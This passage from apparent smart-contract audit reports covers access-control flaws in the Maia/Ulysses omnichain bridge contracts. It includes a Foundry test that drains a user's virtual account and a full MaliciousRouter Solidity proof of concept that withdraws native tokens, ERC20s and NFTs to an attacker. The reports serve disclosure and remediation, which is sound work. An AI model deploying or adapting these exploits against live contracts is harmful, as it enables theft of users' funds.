        VirtualAccount userVA = rootPort.fetchVirtualAccount(user);

        PayableCall[] memory calls = new PayableCall[](2);
        calls[0] = PayableCall({
            target: address(multicallRootBridgeAgent),
            callData: abi.encodeWithSelector(RootBridgeAgent.redeemSettlement.selector, prevNonceRoot - 1),
            value: 0
        });
        calls[1] = PayableCall({
            target: address(newAvaxAssetGlobalAddress),
            callData: abi.encodeWithSelector(ERC20.transfer.selector, attacker, 99 * 1e18),
            value: 0
        });

        vm.prank(attacker);
        userVA.payableCall{value: 0}(calls);

        assertEq(MockERC20(newAvaxAssetGlobalAddress).balanceOf(user), 0);
        assertEq(MockERC20(newAvaxAssetGlobalAddress).balanceOf(address(userVA)), 0);
        assertEq(MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker), 99 ether);
    }


```

## Tools Used

Manual review, Foundry Tests

## Recommended Mitigation Steps

Use the `requiredApprovedCaller()` modifier on `payableCall()` in `VirtualAccount.sol` to only allow the user address owning the virtual account and the approved router to call the function. Consider restricting `redeemSettlement` to be only be callable by the settlement owner OR transfer the funds only to the settlement owner. Additionally consider to only allow `RootBridgeAgent` and the `user` to create virtual accounts in `RootPort` - `fetchVirtualAccount()` / `addVirtualAccount()`.


## Assessed type

Access Control

# Lines of code

https://github.com/code-423n4/2023-09-maia/blob/main/src/VirtualAccount.sol#L51-L82
https://github.com/code-423n4/2023-09-maia/blob/main/src/RootBridgeAgent.sol#L553-L574
https://github.com/code-423n4/2023-09-maia/blob/main/src/RootPort.sol#L369-L375


# Vulnerability details


## Description

The root of the problem is that anyone is allowed to [create bridge agents with a custom router](https://discord.com/channels/810916927919620096/1153743259965857873/1155177444798640200). Users are expected to use Bridge Agents deployed by non-governance actors. An attacker can create a malicious router (and a `RootBridgeAgent` that uses that router) that can steal the funds of `VirtualAccount` when the router is allowed to operate on the `VirtualAccount`'s restricted functions.

**Note**: As written in publicly known issues: a malicious router in itself would be out of scope, but since it affects other contracts and balances, it is in scope

`src/factories/RootBridgeAgentFactory.sol` - [`createBridgeAgent()`](https://www.notion.so/Malicious-Router-can-steal-all-funds-of-Virtual-Account-on-signed-transcations-cca2fe3eb286427a9de1d90f3ee7294e?pvs=21)

```solidity
    function createBridgeAgent(address _newRootRouterAddress) external returns (address newBridgeAgent) {
        newBridgeAgent = address(
            new RootBridgeAgent(
                rootChainId,
                lzEndpointAddress,
                rootPortAddress,
                _newRootRouterAddress
            )
        );

        IRootPort(rootPortAddress).addBridgeAgent(msg.sender, newBridgeAgent);
    }

```

When `RootBridgeAgent.sol` receives the below signed calls from `BranchBridgeAgent`, router is approved to operate on  `VirtualAccount` via a call to `RootPort`.

- `BranchBridgeAgent` -> `RootBridgeAgent`
- [`callOutSigned()`](https://github.com/code-423n4/2023-09-maia/blob/main/src/BranchBridgeAgent.sol#L262-L273) -> [`0x04`](https://github.com/code-423n4/2023-09-maia/blob/main/src/RootBridgeAgent.sol#L539-L571) payload
- [`callOutSignedAndBridged()`](https://github.com/code-423n4/2023-09-maia/blob/main/src/BranchBridgeAgent.sol#L276-L303) -> [`0x05`](https://github.com/code-423n4/2023-09-maia/blob/main/src/RootBridgeAgent.sol#L577-L615) payload
- [`callOutSignedAndBridgeMultiple()`](https://github.com/code-423n4/2023-09-maia/blob/main/src/BranchBridgeAgent.sol#L306-L336) -> [`0x06`](https://github.com/code-423n4/2023-09-maia/blob/main/src/RootBridgeAgent.sol#L617-L655) payload

`src/RootBridgeAgent.sol` - `lzReceiveNonBlocking()` - [`payload 0x04`](https://github.com/code-423n4/2023-09-maia/blob/main/src/RootBridgeAgent.sol#L553-L554)

```solidity
	// Toggle Router Virtual Account use for tx execution
	IPort(localPortAddress).toggleVirtualAccountApproved(userAccount, localRouterAddress);

```

This allows the router to call restricted function with the `requiresApprovedCaller()` modifier on the `VirtualAccount` of the user.

`src/VirtualAccount.sol` - [`requiresApprovedCaller()`](https://github.com/code-423n4/2023-09-maia/blob/main/src/VirtualAccount.sol#L159-L168)

```solidity
    modifier requiresApprovedCaller() {
        if (!IRootPort(localPortAddress).isRouterApproved(this, msg.sender)) {
            if (msg.sender != userAddress) {
                revert UnauthorizedCaller();
            }
        }
        _;
    }

```

When [`RootBridgeAgentExecutor.sol`](https://github.com/code-423n4/2023-09-maia/blob/main/src/RootBridgeAgentExecutor.sol#L150-L235) receives a call from `RootBridgeAgent` on signed payloads it will call the router. That's when the malicious router can call the withdraw functions on `VirtualAccount` of the user, draining all their funds.

`src/VirtualAccount.sol` - [`withdraw functions`](https://github.com/code-423n4/2023-09-maia/blob/main/src/VirtualAccount.sol#L50-L63)

```solidity
    /// @inheritdoc IVirtualAccount
    function withdrawNative(uint256 _amount) external override requiresApprovedCaller {
        msg.sender.safeTransferETH(_amount);
    }

    /// @inheritdoc IVirtualAccount
    function withdrawERC20(address _token, uint256 _amount) external override requiresApprovedCaller {
        _token.safeTransfer(msg.sender, _amount);
    }

    /// @inheritdoc IVirtualAccount
    function withdrawERC721(address _token, uint256 _tokenId) external override requiresApprovedCaller {
        ERC721(_token).transferFrom(address(this), msg.sender, _tokenId);
    }

```

## Proof of Concept

1. Create a file named `MaliciousRouter.sol` in `test/ulysses-omnichain/` and copy paste the below code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {VirtualAccount} from "@omni/VirtualAccount.sol";
import {DepositParams} from "@omni/interfaces/IRootRouter.sol";
import {IRootBridgeAgent} from "@omni/interfaces/IRootBridgeAgent.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract MaliciousRouter {
    IRootBridgeAgent rootBridgeAgent;
    address rootBridgeAgentExecutor;
    address owner;
    address[] erc20Query;
    address[] erc721Query;

    constructor(address _owner) {
        owner = _owner;
    }

    function initialize(address _bridgeAgentAddress) external onlyOwner {
        rootBridgeAgent = IRootBridgeAgent(payable(_bridgeAgentAddress));
        rootBridgeAgentExecutor = IRootBridgeAgent(_bridgeAgentAddress).bridgeAgentExecutorAddress();
    }

    function addERC20(address erc20) external onlyOwner {
        erc20Query.push(erc20);
    }

    function addERC721(address erc721) external onlyOwner {
        erc721Query.push(erc721);
    }

    function executeSigned(bytes calldata, address _account, uint16) external payable onlyExecutor {
        _executeSigned(_account);
    }

    function executeSignedDepositSingle(bytes calldata, DepositParams calldata, address _account, uint16) external payable onlyExecutor {
        _executeSigned(_account);
    }

    function executeSignedDepositMultiple(bytes calldata, DepositParams calldata, address _account, uint16) external payable onlyExecutor {
        _executeSigned(_account);
    }

    function _executeSigned(address user) internal {
        VirtualAccount userVirtualAccount = VirtualAccount(payable(user));

        // withdraw native tokens from virtual account
        userVirtualAccount.withdrawNative(user.balance);
        // send all native tokens to attacker
        payable(owner).call{value: address(this).balance}("");

        // withdraw all erc20s from virtual account
        if (erc20Query.length != 0) {
            for (uint256 i; i < erc20Query.length; i++) {
            // approve future erc20s from the virtual account
            IERC20(erc20Query[i]).approve(owner, type(uint256).max);
            // if user has a balance, withdraw from virtual account and transfer to attacker
            uint256 userBalance = IERC20(erc20Query[i]).balanceOf(user);
                if (userBalance != 0) {
                    userVirtualAccount.withdrawERC20(
                        erc20Query[i],
                        userBalance
                    );
                    // transfer to attacker
                    IERC20(erc20Query[i]).transfer(owner, userBalance);
                }
            }
        }

        if (erc721Query.length != 0) {
            // approve all nfts so owner can claim them one by one
            for (uint256 i; i < erc721Query.length; i++) {
                uint256 userBalance = IERC721(erc721Query[i]).balanceOf(user);
                // sets approval for future NFTs as well
                IERC721(erc721Query[i]).setApprovalForAll(owner, true);
            }
        }

    }

    fallback() external payable {}
    receive() external payable {}

    modifier onlyExecutor() {
        require(msg.sender == rootBridgeAgentExecutor);
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

```

